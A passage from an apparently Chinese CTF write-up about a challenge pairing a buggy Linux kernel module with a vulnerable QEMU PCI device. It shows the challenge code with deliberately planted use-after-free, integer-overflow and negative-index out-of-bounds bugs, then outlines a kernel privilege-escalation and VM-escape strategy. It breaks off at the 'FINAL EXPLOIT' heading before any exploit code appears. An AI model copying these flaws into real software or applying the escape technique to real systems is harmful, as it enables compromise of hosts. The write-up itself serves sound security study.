&gt; size ? size : left;<br><br>        ret = copy_to_user(buf + rlen, &amp;d-&gt;data[d-&gt;offset], clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while reading the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;offset += clen;<br>        rlen += clen;<br><br>        <span class="hljs-keyword">if</span> (d-&gt;offset == d-&gt;len) &#123;<br>            <span class="hljs-keyword">if</span> (d-&gt;len == BYTEDEV_BUF_SIZE) &#123;<br>                kfree(d);<br>                <span class="hljs-comment">/* ther&#x27;s where we made our basic bug: a UAF */</span><br>                <span class="hljs-comment">//dev-&gt;data_queue[dev-&gt;head_idx] = NULL;</span><br>                dev-&gt;head_idx++;<br>                dev-&gt;head_idx %= BYTEDEV_MAX_BUFS;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ret = rlen;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    ret = rlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二个漏洞则存在于写的过程当中，在对统计数据字段的判定当中存在一个整型溢出漏洞，若是正常使用则仍不会触发这个漏洞，但若是我们可以通过 UAF 修改其为一个较大的值，那么我们就可以让内核模块认为该 buffer 依然有可以写入的空间，从而完成越界写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_queue_last_empty</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bytedev *dev)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx = (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br><br>    <span class="hljs-keyword">if</span> (!dev-&gt;data_queue[idx]) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* there&#x27;s where we made our expand bug: integer overflow */</span><br>    <span class="hljs-keyword">return</span> (BYTEDEV_BUF_SIZE - dev-&gt;data_queue[idx]-&gt;len) &gt; <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* the correct version */</span><br>    <span class="hljs-comment">//return dev-&gt;data_queue[idx]-&gt;len &lt; BYTEDEV_BUF_SIZE;</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> wlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br>        <span class="hljs-type">int</span> d_idx;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already full,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>            ret = wlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Fill the unused part of last buffer.</span><br><span class="hljs-comment">         * We mainly fill the data that is less than BYTEDEV_BUF_SIZE there.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_last_empty(dev)) &#123;<br>            <span class="hljs-type">int</span> d_idx = <br>                    (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span> =</span> dev-&gt;data_queue[d_idx];<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left = BYTEDEV_BUF_SIZE - d-&gt;len;<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clen = left &gt; size ? size : left;<br><br>            ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>            <span class="hljs-keyword">if</span> (ret) &#123;<br>                printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br><br>            size -= clen;<br>            d-&gt;len += clen;<br>            wlen += clen;<br><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * When we arrive at there, it means that there&#x27;s no space left</span><br><span class="hljs-comment">         * on the tail buffer, so we alloc a new buffer there.</span><br><span class="hljs-comment">         */</span><br>        d_idx = dev-&gt;tail_idx;<br>        dev-&gt;data_queue[d_idx] = <br>                    kmalloc(BYTEDEV_BUF_SIZE + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data), <br>                            GFP_KERNEL_ACCOUNT);<br>        dev-&gt;tail_idx++;<br>        dev-&gt;tail_idx %= BYTEDEV_MAX_BUFS;<br><br>        d = dev-&gt;data_queue[d_idx];<br>        d-&gt;len = <span class="hljs-number">0</span>;<br>        d-&gt;offset = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">/* Copy the data there */</span><br>        left = BYTEDEV_BUF_SIZE;<br>        clen = left &gt; size ? size : left;<br><br>        ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;len += clen;<br>        wlen += clen;<br>    &#125;<br><br>    ret = wlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二、QEMU-设备部分">二、QEMU 设备部分</h2><p>第二阶段则是对设备 block 模式下的应用，这里 QEMU 模拟了一个类似于硬盘的设备，我们可以读写指定的扇区（大小为 512 字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevRegs</span> &#123;</span><br>    <span class="hljs-type">int</span> mode;<br>    <span class="hljs-type">int</span> blk_idx;<br>    <span class="hljs-type">int</span> blk_status;<br>&#125; BYTEPCIDevRegs;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    BYTEPCIDevRegs regs;<br><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br><br>    <span class="hljs-type">char</span> *blk_mem[BYTEDEV_SECTOR_NUM];<br>&#125; BYTEPCIDevState;<br></code></pre></td></tr></table></figure><p>其中我们使用 PMIO 来实现设备模式的获取与切换、扇区的切换，使用 MMIO 来实现对特定扇区的读写，而漏洞便出在扇区的切换上，虽然设备里有一个后向的扇区索引越界检查，但是存储当前扇区索引所使用的为 int 类型的变量，<strong>而设备代码中并没有对索引为负数的情况进行检查</strong>，因此我们可以进行前向的越界操作，若是在低地址处存在可利用的指针则可以直接完成越界的读写操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">byte_dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    BYTEPCIDevState *ds = BYTEDEV_PCI(opaque);<br>    <span class="hljs-type">int</span> op_idx = val;<br><br>    <span class="hljs-keyword">if</span> (size != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    smp_mb();<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_MODE:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_BLK:<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_STREAM:<br>                    ds-&gt;regs.mode = val;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_BLK_IDX:<br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.blk_status == BYTEDEV_BLK_STATUS_BUSY) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.mode != BYTEDEV_MODE_BLK) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-comment">/** </span><br><span class="hljs-comment">             * There&#x27;s where we made our basic bug: OOB rw forward </span><br><span class="hljs-comment">             * Because there&#x27;s no check for minus idx there.</span><br><span class="hljs-comment">             * */</span><br>            <span class="hljs-keyword">if</span> (op_idx &gt;= BYTEDEV_SECTOR_NUM) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            ds-&gt;regs.blk_idx = op_idx;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_BUSY;<br>            <span class="hljs-keyword">if</span> (!ds-&gt;blk_mem[ds-&gt;regs.blk_idx]) &#123;<br>                ds-&gt;blk_mem[ds-&gt;regs.blk_idx] = g_malloc(BYTEDEV_SECTOR_SIZE);<br>            &#125;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_READY;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1>0x02.漏洞利用</h1><p>漏洞的利用存在两个阶段：第一阶段是利用内核模块中流模式存在的漏洞完成提权，第二阶段则是利用模拟设备中存在的漏洞完成虚拟化逃逸</p><h2 id="Stage-I-kernel-primitive">Stage.I - kernel primitive</h2><p>由于我们直接有 UAF 和越界读写，那么第一阶段的解题思路就比较清晰了，我们可以先写入一个 buffer 后读取出该 buffer 制造出 UAF，之后利用其他结构体改写其数据统计字段，之后再通过越界写进行提权，需要注意的是由于开启了 hardened usercopy 检查，我们需要直接在下一个 object 中进行数据写入，而不能进行跨 object 的数据拷贝</p><p>由于分配 buffer 所用的 flag 为 GFP_KERNEL_ACCOUNT，因此最后的提权解法直接套用 CVE-2021-22555 的堆喷 msg_msg + sk_buff 的模板即可</p><h2 id="Stage-II-QEMU-escape">Stage.II - QEMU escape</h2><p>由于读写过程为通过对应索引的指针完成读写，因此我们需要向前寻找指向合适区域的指针来实现利用，万幸的是我们前向可读的区域中有 MemoryRegion，还有设备结构体的父类 PCIDevice ：</p><p>利用 MemoryRegion 我们可以泄露出设备自身结构体的地址并读写开头的 512 字节，我们可以在其 io_regions 中的空闲字段构造 ROP 或是一些其他东西</p><p>对于 PCIDevice 我们可以利用最上层的父类 Object 的 properties 成员泄露出 glib 的基地址，从而泄露出 glibc 的基地址（其加载地址间偏移固定）；同时我们还能通过其 io_regions 字段完成对 MemoryRegion 的读写</p><p>那么整个利用思路就非常清晰了：我们先前向读取 properties 泄露出 libc，之后读取 MemoryRegion 泄露出设备结构体地址，在 PCIDevice.io_regions 上构造 fake MemoryRegionOps 后劫持 PMIO 的 MemoryRegion 的 ops 从而完成虚拟机逃逸</p><h2 id="FINAL-EXPLOIT">FINAL EXPLOIT</h2><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span 